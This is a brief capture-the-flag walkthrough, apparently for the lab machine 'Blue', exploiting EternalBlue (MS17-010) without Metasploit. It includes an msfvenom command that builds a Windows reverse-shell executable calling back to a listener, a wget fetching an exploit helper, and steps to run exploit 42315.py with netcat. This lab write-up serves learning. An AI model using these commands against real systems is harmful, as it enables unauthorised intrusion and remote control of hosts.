Blue without Metasploit:

![Blue](https://user-images.githubusercontent.com/55708909/91400272-fe577080-e85c-11ea-83eb-62df0e7decde.png)

Starting with Nmap Scan :

Nmap -sC -sV -T4 -A -O -oA Blue -p- 10.10.10.40

![Blue_nmap](https://user-images.githubusercontent.com/55708909/91406950-14b2fb80-e860-11ea-963e-24b543e3b6b1.png)

Since basic tools doesn't work therefore again i run nmap vulnerability scan its a kind of methodolgy which is helpful for me.

![Blue_vuln](https://user-images.githubusercontent.com/55708909/91407940-a91d5e00-e860-11ea-9af1-7b89d7ce97fb.png)


Nmap found only one vulnerability that is eternal blue so we are going to exploit it.

![Blue_exploit](https://user-images.githubusercontent.com/55708909/91408457-8b042d80-e861-11ea-90ee-cb9a68007cd4.png)

First create a payload using msfvenom 

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe

edit 42315.py files

![42315_PART_1](https://user-images.githubusercontent.com/55708909/91409346-eaaf0880-e862-11ea-8b35-88a345bb3cf7.png)

![42315_PART_2](https://user-images.githubusercontent.com/55708909/91409465-103c1200-e863-11ea-8e7d-b6e316b7b6fb.png)

Before running the exploit you need one more file that is mysmb.py files which you can get it from here

wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/mysmb.py

now open a netcat session at port 4444 and run the exploit using these commands : python 42315.py 10.10.10.40

Here we have a netcat session from target machine.

![Blue_shell](https://user-images.githubusercontent.com/55708909/91410383-76756480-e864-11ea-8f11-642241382da9.png)

Flags:

![Blue_flags](https://user-images.githubusercontent.com/55708909/91410690-e7b51780-e864-11ea-88eb-0a6fdda131c6.png)













